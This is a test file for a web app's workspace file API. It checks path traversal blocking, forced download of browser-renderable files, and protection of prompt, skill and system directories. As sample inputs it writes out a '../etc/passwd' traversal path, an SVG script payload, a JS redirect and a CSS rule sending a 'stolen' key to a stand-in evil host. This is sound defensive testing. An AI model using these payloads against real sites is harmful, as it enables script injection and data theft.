import { describe, it, expect, afterEach, vi } from 'vitest';
import fs from 'node:fs';
import fsp from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';
import { fileURLToPath } from 'node:url';
import { buildApp, type AppDeps } from '../app.js';
import { openDb } from '../db/client.js';
import { runMigrations } from '../db/migrate.js';
import { runSeed } from '../db/seed.js';
import { createJwtService } from '../services/jwt.js';
import { newId } from '@buck/shared';
import { sha256Hex } from '../utils/crypto.js';
import { users, sessionsAuth } from '../db/schema.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const migrationsDir = path.resolve(here, '..', '..', 'migrations');

const SESSION_TTL_MS = 30 * 24 * 60 * 60 * 1000;
const CSRF_TOKEN = 'test-csrf-token-abc123';

function tmpDb() {
  return path.join(
    os.tmpdir(),
    `buck-workspace-${Date.now()}-${Math.floor(Math.random() * 1e9)}.db`,
  );
}

function tmpDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'buck-ws-'));
}

interface TestCtx {
  dbPath: string;
  workspaceDir: string;
  app: ReturnType<typeof buildApp>;
  sessionJwt: string;
  userId: string;
}

async function makeCtx(): Promise<TestCtx> {
  const dbPath = tmpDb();
  const url = `file:${dbPath}`;
  runMigrations({ databaseUrl: url, migrationsFolder: migrationsDir });
  runSeed({
    databaseUrl: url,
    allowedEmails: ['alice@example.com'],
    mcpBibleUrl: 'http://bible-mcp:7801',
  });
  const db = openDb(url);
  const jwt = createJwtService({
    secret: 'a'.repeat(32),
    issuer: 'buck',
    audience: 'buck-web',
  });
  const email = { sendMagicLink: vi.fn(async () => {}) };

  const allUsers = db.db.select().from(users).all();
  const alice = allUsers.find((u) => u.email === 'alice@example.com');
  if (!alice) throw new Error('alice not found in seed');
  const userId = alice.id;

  const ts = Date.now();
  const sessionJwt = await jwt.sign({ sub: userId, scope: 'app' }, '30d');
  const sessionHash = sha256Hex(sessionJwt);
  db.db
    .insert(sessionsAuth)
    .values({
      id: newId(),
      userId,
      tokenHash: sessionHash,
      scope: 'app',
      expiresAt: ts + SESSION_TTL_MS,
      createdAt: ts,
    })
    .run();

  const workspaceDir = tmpDir();

  const deps: AppDeps = {
    db,
    email,
    jwt,
    allowedEmails: ['alice@example.com'],
    publicBaseUrl: 'https://buck.example.com',
    nowMs: () => ts,
    workspaceDir,
  };

  const app = buildApp(deps);
  return { dbPath, workspaceDir, app, sessionJwt, userId };
}

function authHeaders(sessionJwt: string): Record<string, string> {
  return {
    cookie: `buck_session=${sessionJwt}; buck_csrf=${CSRF_TOKEN}`,
  };
}

function authMutHeaders(sessionJwt: string): Record<string, string> {
  return {
    'content-type': 'application/json',
    cookie: `buck_session=${sessionJwt}; buck_csrf=${CSRF_TOKEN}`,
    'x-csrf-token': CSRF_TOKEN,
  };
}

describe('workspace routes', () => {
  let ctx: TestCtx;

  afterEach(async () => {
    if (ctx?.dbPath && fs.existsSync(ctx.dbPath)) {
      fs.unlinkSync(ctx.dbPath);
    }
    if (ctx?.workspaceDir && fs.existsSync(ctx.workspaceDir)) {
      await fsp.rm(ctx.workspaceDir, { recursive: true });
    }
  });

  describe('GET /api/workspace/tree', () => {
    it('returns empty tree for empty workspace', async () => {
      ctx = await makeCtx();
      const res = await ctx.app.request('/api/workspace/tree', {
        headers: authHeaders(ctx.sessionJwt),
      });
      expect(res.status).toBe(200);
      const body = (await res.json()) as { tree: unknown[] };
      expect(body.tree).toEqual([]);
    });

    it('returns files and directories', async () => {
      ctx = await makeCtx();
      // Create some files and dirs
      await fsp.mkdir(path.join(ctx.workspaceDir, 'notes'), { recursive: true });
      await fsp.writeFile(
        path.join(ctx.workspaceDir, 'hello.txt'),
        'world',
      );
      await fsp.writeFile(
        path.join(ctx.workspaceDir, 'notes', 'draft.md'),
        '# Draft',
      );

      const res = await ctx.app.request('/api/workspace/tree', {
        headers: authHeaders(ctx.sessionJwt),
      });
      expect(res.status).toBe(200);
      const body = (await res.json()) as { tree: Array<{ name: string; type: string }> };
      const names = body.tree.map((e) => e.name);
      expect(names).toContain('hello.txt');
      expect(names).toContain('notes');
    });

    it('excludes .attachments directory', async () => {
      ctx = await makeCtx();
      await fsp.mkdir(path.join(ctx.workspaceDir, '.attachments'), { recursive: true });
      await fsp.writeFile(
        path.join(ctx.workspaceDir, '.attachments', 'secret.bin'),
        'data',
      );
      await fsp.writeFile(path.join(ctx.workspaceDir, 'visible.txt'), 'ok');

      const res = await ctx.app.request('/api/workspace/tree', {
        headers: authHeaders(ctx.sessionJwt),
      });
      expect(res.status).toBe(200);
      const body = (await res.json()) as { tree: Array<{ name: string }> };
      const names = body.tree.map((e) => e.name);
      expect(names).not.toContain('.attachments');
      expect(names).toContain('visible.txt');
    });
  });

  describe('GET /api/workspace/file', () => {
    it('serves a file', async () => {
      ctx = await makeCtx();
      await fsp.writeFile(path.join(ctx.workspaceDir, 'test.txt'), 'hello world');

      const res = await ctx.app.request('/api/workspace/file?path=test.txt', {
        headers: authHeaders(ctx.sessionJwt),
      });
      expect(res.status).toBe(200);
      const text = await res.text();
      expect(text).toBe('hello world');
    });

    it('blocks path traversal (../)', async () => {
      ctx = await makeCtx();
      const res = await ctx.app.request(
        '/api/workspace/file?path=../../../etc/passwd',
        { headers: authHeaders(ctx.sessionJwt) },
      );
      expect(res.status).toBe(403);
    });

    it('returns 404 for missing file', async () => {
      ctx = await makeCtx();
      const res = await ctx.app.request('/api/workspace/file?path=nope.txt', {
        headers: authHeaders(ctx.sessionJwt),
      });
      expect(res.status).toBe(404);
    });

    it('returns 422 if path is a directory', async () => {
      ctx = await makeCtx();
      await fsp.mkdir(path.join(ctx.workspaceDir, 'mydir'), { recursive: true });

      const res = await ctx.app.request('/api/workspace/file?path=mydir', {
        headers: authHeaders(ctx.sessionJwt),
      });
      expect(res.status).toBe(422);
    });

    describe('VULN-003 — force download on browser-renderable extensions', () => {
      const cases: Array<[string, string]> = [
        ['evil.html', '<html><body>phishing form</body></html>'],
        ['evil.htm', '<html></html>'],
        ['evil.svg', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'],
        ['evil.js', 'window.location="https://evil.example.com"'],
        ['evil.mjs', 'export const x = 1'],
        ['evil.cjs', 'module.exports = {}'],
        ['evil.css', ':focus { background: url(//evil/?key=stolen) }'],
        ['evil.xml', '<?xml version="1.0"?><root/>'],
        ['evil.xhtml', '<html xmlns="http://www.w3.org/1999/xhtml"></html>'],
      ];

      for (const [filename, payload] of cases) {
        it(`forces attachment + octet-stream for ${filename}`, async () => {
          ctx = await makeCtx();
          await fsp.writeFile(path.join(ctx.workspaceDir, filename), payload);

          const res = await ctx.app.request(
            `/api/workspace/file?path=${filename}`,
            { headers: authHeaders(ctx.sessionJwt) },
          );
          expect(res.status).toBe(200);
          expect(res.headers.get('content-type')).toBe('application/octet-stream');
          const cd = res.headers.get('content-disposition') ?? '';
          expect(cd).toMatch(/^attachment;/);
          expect(cd).toContain(filename);
        });
      }

      it('still serves images with their native MIME (PNG inline)', async () => {
        ctx = await makeCtx();
        // Minimal PNG signature is enough for the route — it does not sniff
        // magic bytes here, only relies on extension.
        const png = Buffer.from([
          0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
        ]);
        await fsp.writeFile(path.join(ctx.workspaceDir, 'ok.png'), png);

        const res = await ctx.app.request('/api/workspace/file?path=ok.png', {
          headers: authHeaders(ctx.sessionJwt),
        });
        expect(res.status).toBe(200);
        expect(res.headers.get('content-type')).toBe('image/png');
        expect(res.headers.get('content-disposition')).toBeNull();
      });

      it('serves text/markdown inline (no forced download)', async () => {
        ctx = await makeCtx();
        await fsp.writeFile(path.join(ctx.workspaceDir, 'note.md'), '# hi');

        const res = await ctx.app.request('/api/workspace/file?path=note.md', {
          headers: authHeaders(ctx.sessionJwt),
        });
        expect(res.status).toBe(200);
        expect(res.headers.get('content-type')).toBe('text/markdown');
        expect(res.headers.get('content-disposition')).toBeNull();
      });
    });
  });

  describe('POST /api/workspace/directory', () => {
    it('creates a directory', async () => {
      ctx = await makeCtx();
      const res = await ctx.app.request('/api/workspace/directory', {
        method: 'POST',
        headers: authMutHeaders(ctx.sessionJwt),
        body: JSON.stringify({ path: 'projects/novel' }),
      });
      expect(res.status).toBe(201);
      const body = (await res.json()) as { ok: boolean };
      expect(body.ok).toBe(true);

      // Verify directory exists
      const stat = await fsp.stat(path.join(ctx.workspaceDir, 'projects', 'novel'));
      expect(stat.isDirectory()).toBe(true);
    });
  });

  describe('PATCH /api/workspace/file', () => {
    it('renames a file', async () => {
      ctx = await makeCtx();
      await fsp.writeFile(path.join(ctx.workspaceDir, 'old.txt'), 'content');

      const res = await ctx.app.request('/api/workspace/file?path=old.txt', {
        method: 'PATCH',
        headers: authMutHeaders(ctx.sessionJwt),
        body: JSON.stringify({ newName: 'new.txt' }),
      });
      expect(res.status).toBe(200);
      const body = (await res.json()) as { ok: boolean; path: string };
      expect(body.ok).toBe(true);
      expect(body.path).toBe('new.txt');

      // Old file gone, new file exists
      expect(fs.existsSync(path.join(ctx.workspaceDir, 'old.txt'))).toBe(false);
      expect(fs.existsSync(path.join(ctx.workspaceDir, 'new.txt'))).toBe(true);
    });
  });

  describe('protected roots — write surfaces', () => {
    for (const dir of ['prompts', 'skills', 'systems']) {
      it(`POST /file refuses ${dir}/*`, async () => {
        ctx = await makeCtx();
        const form = new FormData();
        form.append('file', new Blob(['malicious']), 'x.md');
        form.append('path', `${dir}/pwn.md`);
        const res = await ctx.app.request('/api/workspace/file', {
          method: 'POST',
          headers: {
            cookie: `buck_session=${ctx.sessionJwt}; buck_csrf=${CSRF_TOKEN}`,
            'x-csrf-token': CSRF_TOKEN,
          },
          body: form,
        });
        expect(res.status).toBe(403);
        expect(fs.existsSync(path.join(ctx.workspaceDir, dir, 'pwn.md'))).toBe(false);
      });

      it(`POST /directory refuses ${dir}/*`, async () => {
        ctx = await makeCtx();
        const res = await ctx.app.request('/api/workspace/directory', {
          method: 'POST',
          headers: authMutHeaders(ctx.sessionJwt),
          body: JSON.stringify({ path: `${dir}/nested` }),
        });
        expect(res.status).toBe(403);
      });

      it(`PATCH /file refuses renaming INTO ${dir}/*`, async () => {
        ctx = await makeCtx();
        await fsp.writeFile(path.join(ctx.workspaceDir, 'source.md'), 'x');
        await fsp.mkdir(path.join(ctx.workspaceDir, dir), { recursive: true });
        const res = await ctx.app.request(
          `/api/workspace/file?path=${dir}/source.md`,
          {
            method: 'PATCH',
            headers: authMutHeaders(ctx.sessionJwt),
            body: JSON.stringify({ newName: 'pwn.md' }),
          },
        );
        // Source path is protected → 403 before any rename happens
        expect(res.status).toBe(403);
      });
    }
  });

  describe('DELETE /api/workspace/file', () => {
    it('deletes a file', async () => {
      ctx = await makeCtx();
      await fsp.writeFile(path.join(ctx.workspaceDir, 'bye.txt'), 'gone');

      const res = await ctx.app.request('/api/workspace/file?path=bye.txt', {
        method: 'DELETE',
        headers: {
          cookie: `buck_session=${ctx.sessionJwt}; buck_csrf=${CSRF_TOKEN}`,
          'x-csrf-token': CSRF_TOKEN,
        },
      });
      expect(res.status).toBe(200);
      expect(fs.existsSync(path.join(ctx.workspaceDir, 'bye.txt'))).toBe(false);
    });

    it('refuses to delete protected directory: prompts', async () => {
      ctx = await makeCtx();
      await fsp.mkdir(path.join(ctx.workspaceDir, 'prompts'), { recursive: true });

      const res = await ctx.app.request('/api/workspace/file?path=prompts', {
        method: 'DELETE',
        headers: {
          cookie: `buck_session=${ctx.sessionJwt}; buck_csrf=${CSRF_TOKEN}`,
          'x-csrf-token': CSRF_TOKEN,
        },
      });
      expect(res.status).toBe(403);
    });

    it('refuses to delete protected directory: skills', async () => {
      ctx = await makeCtx();
      await fsp.mkdir(path.join(ctx.workspaceDir, 'skills'), { recursive: true });

      const res = await ctx.app.request('/api/workspace/file?path=skills', {
        method: 'DELETE',
        headers: {
          cookie: `buck_session=${ctx.sessionJwt}; buck_csrf=${CSRF_TOKEN}`,
          'x-csrf-token': CSRF_TOKEN,
        },
      });
      expect(res.status).toBe(403);
    });

    it('refuses to delete files inside protected dirs', async () => {
      ctx = await makeCtx();
      await fsp.mkdir(path.join(ctx.workspaceDir, 'prompts'), { recursive: true });
      await fsp.writeFile(
        path.join(ctx.workspaceDir, 'prompts', 'system.md'),
        'hello',
      );

      const res = await ctx.app.request(
        '/api/workspace/file?path=prompts/system.md',
        {
          method: 'DELETE',
          headers: {
            cookie: `buck_session=${ctx.sessionJwt}; buck_csrf=${CSRF_TOKEN}`,
            'x-csrf-token': CSRF_TOKEN,
          },
        },
      );
      expect(res.status).toBe(403);
      expect(
        fs.existsSync(path.join(ctx.workspaceDir, 'prompts', 'system.md')),
      ).toBe(true);
    });

    it('refuses to delete protected directory: systems', async () => {
      ctx = await makeCtx();
      await fsp.mkdir(path.join(ctx.workspaceDir, 'systems'), { recursive: true });
      await fsp.writeFile(path.join(ctx.workspaceDir, 'systems', 'SYSTEM.md'), 'x');

      const res = await ctx.app.request(
        '/api/workspace/file?path=systems/SYSTEM.md',
        {
          method: 'DELETE',
          headers: authMutHeaders(ctx.sessionJwt),
        },
      );
      expect(res.status).toBe(403);
      expect(
        fs.existsSync(path.join(ctx.workspaceDir, 'systems', 'SYSTEM.md')),
      ).toBe(true);
    });

    it('refuses to delete nested paths inside protected dirs (skills)', async () => {
      ctx = await makeCtx();
      await fsp.mkdir(path.join(ctx.workspaceDir, 'skills', 'foo'), { recursive: true });
      await fsp.writeFile(path.join(ctx.workspaceDir, 'skills', 'foo', 'SKILL.md'), 'x');

      const res = await ctx.app.request(
        '/api/workspace/file?path=skills/foo/SKILL.md',
        {
          method: 'DELETE',
          headers: {
            cookie: `buck_session=${ctx.sessionJwt}; buck_csrf=${CSRF_TOKEN}`,
            'x-csrf-token': CSRF_TOKEN,
          },
        },
      );
      expect(res.status).toBe(403);
    });
  });
});
